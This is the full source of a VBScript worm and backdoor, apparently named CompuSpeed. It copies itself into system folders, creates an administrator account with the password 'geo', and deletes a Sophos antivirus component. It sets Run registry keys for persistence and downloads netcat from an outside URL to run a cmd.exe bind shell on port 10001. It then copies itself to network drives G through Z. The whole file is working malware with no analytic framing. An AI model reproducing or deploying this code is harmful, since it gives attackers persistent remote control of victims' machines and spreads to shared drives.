'Sets Script Objects
Set WS = CreateObject("Wscript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

'Copies itself to the C:\ drive
On error resume next
FSO.CopyFile "CompuSpeed.vbs", "C:\WinNT.Dat"
FSO.CopyFile "CompuSpeed.vbs", "C:\Windows\System32\CompuSpeed.vbs"
FSO.CopyFile "CompuSpeed.vbs", "C:\Winnt\System32\CompuSpeed.vbs"

'Adds a new user
On Error Resume Next
WS.Run("Net User geo geo /add"), 0

'Attempts to add new user to the administrative users group
WS.Run("Net localgroup administrators Geo /add"), 0

'If Present Sophos Anti-Virus Automatic Scanning Is Disabled
On Error Resume Next
FSO.DeleteFile "C:\Program Files\Sophos Sweep For NT\ICMON.EXE"

'Attempts to copy itself to various places on the computer as a coverup named file
FSO.CopyFile "C:\WinNT.Dat", "C:\Help.cfg"
FSO.CopyFile "C:\WinNT.Dat", "C:\WinNT.DAT"

'Installs into the registry
Ws.RegWrite "HKLM\Software\Microsoft\Windows\Currentversion\run\Geography TX 1.0 NT", "C:\Winnt\System32\CompuSpeed.vbs"
Ws.RegWrite "HKLM\Software\Microsoft\Windows\Currentversion\run\Geography TX 1.0 XP", "C:\Windows\System32\CompuSpeed.vbs"
WS.RegWrite "HKLM\Software\Microsoft\Windows\Currentversion\uninstall\CompuSpeed\DisplayName", "Geography TX-A"
WS.RegWrite "HKLM\Software\Microsoft\Windows\Currentversion\uninstall\CompuSpeed\UninstallString", "taskkill /f /im svchost.exe"

'Attempts to start the telnet service
WS.Run("Net Start Telnet /User:Geo"), 0

'Downloads Netcat to create a backdoor
On error resume next
set ws = createobject("wscript.shell")
sSource = "http://www.meer.net/%7Edougt/minimo_ce/nc/nc.exe"
sDest = "C:\winnt\system32\winntsrv.exe"
sDest = "C:\windows\system32\winntsrv.exe"

wscript.sleep 100000

set oHTTP = WScript.CreateObject("Microsoft.XMLHTTP")
set oFSO = WScript.CreateObject("Scripting.FileSystemObject")

oHTTP.open "GET", sSource, False
oHTTP.send
body8209 = oHTTP.responseBody
set oHTTP = nothing

sOut = ""
For i = 0 to UBound(body8209)
     sOut = sOut & chrw(ascw(chr(ascb(midb(body8209,i+1,1)))))
Next

set oTS = oFSO.CreateTextFile(sDest, True)
oTS.Write sOut
oTS.Close
set oTS = Nothing
set oFSO = Nothing

'Adds netcat to registry for execution on user logon
WS.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\NC1565", "winntsrv -l -p10001 -d -e cmd.exe -L"

'Anyone who knows that this program is on the system can now access the machine via telnet
'on port 10001 and when it asks for authentication they can use the newley added user, geo
'with the password, yes you guessed it, 'geo'

'Copies itself to some network shares
FSO.CopyFile "C:\WinNT.dat", "g:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "H:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "I:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "J:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "K:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "L:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "M:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "N:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "O:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "P:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "Q:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "R:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "S:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "T:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "U:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "V:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "W:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "X:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "Y:\CompuSpeed.vbs"
FSO.CopyFile "C:\WinNT.dat", "Z:\CompuSpeed.vbs"